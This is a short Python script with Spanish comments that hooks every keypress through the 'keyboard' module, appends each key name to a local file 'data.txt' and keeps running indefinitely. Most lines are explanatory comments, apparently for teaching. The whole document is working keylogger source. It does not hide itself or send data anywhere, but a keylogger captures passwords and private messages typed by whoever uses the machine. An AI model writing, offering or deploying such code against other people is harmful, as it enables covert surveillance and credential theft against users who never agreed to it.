import keyboard  # Importa el módulo 'keyboard' para poder detectar las teclas que se presionan.

# Esta función que se ejecuta cada vez que se presiona una tecla.
def pressedkeys(key):
    # Abre (o crea) el archivo 'data.txt' en modo agregar (append).
    with open('data.txt', 'a') as file:
        # Si la tecla presionada es la barra espaciadora ('space'), escribe un espacio.
        if key.name == 'space':
            file.write(' ')
        else:
            # Si no, escribe el nombre de la tecla presionada
            file.write(key.name)

# Asocia la función 'pressedkeys' a cualquier tecla que se presione.
keyboard.on_press(pressedkeys)

# Espera indefinidamente que se presionen teclas (mantiene el programa en ejecución).
keyboard.wait()